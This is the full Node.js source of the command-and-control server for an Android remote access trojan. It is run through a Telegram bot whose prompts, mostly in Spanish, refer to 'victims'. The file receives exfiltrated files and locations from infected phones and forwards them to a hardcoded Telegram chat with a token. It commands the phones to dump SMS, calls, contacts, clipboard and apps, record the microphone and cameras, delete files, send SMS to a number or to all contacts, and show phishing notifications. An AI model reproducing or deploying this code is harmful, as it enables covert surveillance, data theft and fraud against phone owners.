const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '6727124685:AAGMuK-rjINn4V1WhTRcTtQvHKF2V0awsas'
const id = '-1002178447508'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''
app.get('/', function (req, res) {
    res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• Mensaje de <b>${req.headers.model}</b> dispositivo`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• Localización de<b>${req.headers.model}</b> dispositivo`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `°• Nuevo dispositivo conectado🥴\n\n` +
        `• Modelo--del--dispositivø : <b>${model}</b>\n` +
        `• Bateríã🔋: <b>${battery}</b>\n` +
        `• Versión de android📱: <b>${version}</b>\n` +
        `• Brillo de la pantalla💡: <b>${brightness}</b>\n` +
        `• Provedor : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• Dispositivo desconectado\n\n` +
            `• Modelo del dispositivo : <b>${model}</b>\n` +
            `• Batería : <b>${battery}</b>\n` +
            `• Versión de android : <b>${version}</b>\n` +
            `• Brillo de la pantalla : <b>${brightness}</b>\n` +
            `• Provedor : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°Repita el número°')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• Escriba el número al que desea enviar el mensaje\n\n' +
                '• Escriba el número de forma internacional, el número debe ser del país del cual es la víctima',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• Escriba el mensaje que desea enviar')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Tu solicitud esta en progreso\n\n' +
                '• Recibiras respuesta en un momento',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Dispositivos conectados"], ["Ejecutar un comando"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Ponga el mensaje que desea enviar')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Tu solicitud esta en progreso\n\n' +
                '• Recibiras respuesta en un momento',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Dispositivos conectados"], ["Ejecutar un comando"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Introduzca la ruta del archivo que de desea descargar')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Tu solicitud esta en progreso\n\n' +
                '• Recibiras respuesta en un momento',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Dispositivos conectados"], ["Ejecutar un comando"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Introduce la dirección del archivo que desea eliminar')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Tu solicitud esta en progreso \n\n' +
                '• Recibiras respuesta en un momento',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Dispositivos conectados"], ["Ejecutar un comando"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Introduzca la duración de la grabacion del audio')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Tu solicitud se esta procesando\n\n' +
                '• Recibiras respuesta en un momento',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Dispositivos conectados"], ["Ejecute un comando"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Introduzca la duración de la grabación de la cámara')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Tu solicitud esta en progreso\n\n' +
                '• Recibiras respuesta en un momento',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Dispositivos conectados"], ["Ejecutar un comando"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Introduzca la duración de la camara frontal')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°•Tu solicitud esta en progreso\n\n' +
                '• Recibiras respuesta en un momento',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Dispositivo𝙨 conectados"], ["Ejecute un comando"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Introduzca el mensaje que va a aparecer en el dispositivo')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°•Tu solicitud esta en progreso\n\n' +
                '• Recibiras respuesta en un momento',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Dispositivos conetados"], ["Ejecute un comando"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
                '• ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°•Tu solicitud esta en progreso\n\n' +
                '• Recibiras respuesta en un momento',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Dispositivos conetados"], ["Ejecute un comando"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°•Tu solicitud esta en progreso\n\n' +
                '• Recibiras respuesta en un momento',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Dispositivos conetados"], ["Ejecute un comando"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• Bienvenido al panel de control\n\n' +
                '• El bot esta en linea\n\n' +
                '• Esperando conexiones\n\n' +
                '• Con el teclado puedes realizar las acciones\n\n' +
                '• Para comprobar el estado del bot escriba /start',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Dispositivos conetados"], ["Ejecute un comando"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == 'Dispositivos conetados') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• No hay dispositivos disponibles\n\n' +
                    '• Asegurate de que la victima haya installado la aplicación'
                )
            } else {
                let text = '°• 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 dispositivo𝙨 :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• Modelo del dispositivo : <b>${value.model}</b>\n` +
                        `• Batería : <b>${value.battery}</b>\n` +
                        `• Versión de android : <b>${value.version}</b>\n` +
                        `• Brillo de la pantalla : <b>${value.brightness}</b>\n` +
                        `• Provedor : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == 'Ejecute un comando') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°•No hay dispositivos disponibles\n\n' +
                    '• Asegurate de que la victima haya installado la aplicación'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '°• Selecciona un dispositivo para ejecutar', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '°• Permiso denegado')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`°• Selecciona un comando para el dispositivo: <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: 'Aplicaciones', callback_data: `apps:${uuid}`},
                        {text: 'Información del dispositivo', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: 'Obtener archivo', callback_data: `file:${uuid}`},
                        {text: 'Eliminar archivo', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: 'Portapapeles', callback_data: `clipboard:${uuid}`},
                        {text: 'Microfono', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: 'Camara tracera', callback_data: `camera_main:${uuid}`},
                        {text: 'Camara frontal', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'Localizacion(error)', callback_data: `location:${uuid}`},
                        {text: '𝙏𝙤𝙖𝙨𝙩', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: 'Llamadas', callback_data: `calls:${uuid}`},
                        {text: 'Contactos', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: 'Vibrar', callback_data: `vibrate:${uuid}`},
                        {text: 'Mostrar notificacion', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: 'Mensajes', callback_data: `messages:${uuid}`},
                        {text: 'Enviar un mensaje', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: 'Reproducir audio', callback_data: `play_audio:${uuid}`},
                        {text: 'Detener audio', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: 'Enviar un mensaje a todos los ctc',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°•Tu solicitud esta en progreso\n\n' +
            '• Recibiras respuesta en un momento',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Dispositivos conetados"], ["Ejecute un comando"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°•Tu solicitud esta en progreso\n\n' +
            '• Recibiras respuesta en un momento',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Dispositivos conetados"], ["Ejecute un comando"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°•Tu solicitud esta en progreso\n\n' +
            '• Recibiras respuesta en un momento',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Dispositivos conetados"], ["Ejecute un comando"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°•Tu solicitud esta en progreso\n\n' +
            '• Recibiras respuesta en un momento',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Dispositivos conetados"], ["Ejecute un comando"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°•Tu solicitud esta en progreso\n\n' +
            '• Recibiras respuesta en un momento',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Dispositivos conetados"], ["Ejecute un comando"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°•Tu solicitud esta en progreso\n\n' +
            '• Recibiras respuesta en un momento',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Dispositivos conetados"], ["Ejecute un comando"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°•Tu solicitud esta en progreso\n\n' +
            '• Recibiras respuesta en un momento',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Dispositivos conetados"], ["Ejecute un comando"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°•Tu solicitud esta en progreso\n\n' +
            '• Recibiras respuesta en un momento',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Dispositivos conetados"], ["Ejecute un comando"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°•Tu solicitud esta en progreso\n\n' +
            '• Recibiras respuesta en un momento',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Dispositivos conetados"], ["Ejecute un comando"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°•Tu solicitud esta en progreso\n\n' +
            '• Recibiras respuesta en un momento',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Dispositivos conetados"], ["Ejecute un comando"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°•Tu solicitud esta en progreso\n\n' +
            '• Recibiras respuesta en un momento',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Dispositivos conetados"], ["Ejecute un comando"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Porfavor ponga el numero al que desea enviar el sms\n\n' +
            '•Escriba el numero con el codigo local',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Introduzca el mensaje que desea enviar a todos\n\n' +
            '• Cuidado con lo que envias!',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Introduce la ruta del archivo\n\n' +
            '•  Por ejemplo, DCIM/Camer para recibir la galeria.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚\n\n' +
            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ᴅᴇʟᴇᴛᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\n\n' +
            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Introduzca el mensaje que va a aparecer en el dispositivo\n\n' +
            '• ᴛᴏᴀꜱᴛ ɪꜱ ᴀ ꜱʜᴏʀᴛ ᴍᴇꜱꜱᴀɢᴇ ᴛʜᴀᴛ ᴀᴘᴘᴇᴀʀꜱ ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ ꜱᴄʀᴇᴇɴ ꜰᴏʀ ᴀ ꜰᴇᴡ ꜱᴇᴄᴏɴᴅꜱ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
            '• ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ʙᴇ ᴀᴘᴘᴇᴀʀ ɪɴ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ꜱᴛᴀᴛᴜꜱ ʙᴀʀ ʟɪᴋᴇ ʀᴇɢᴜʟᴀʀ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮\n\n' +
            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴅɪʀᴇᴄᴛ ʟɪɴᴋ ᴏꜰ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ꜱᴏᴜɴᴅ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴛʜᴇ ꜱᴏᴜɴᴅ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ᴘʟᴀʏᴇᴅ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);
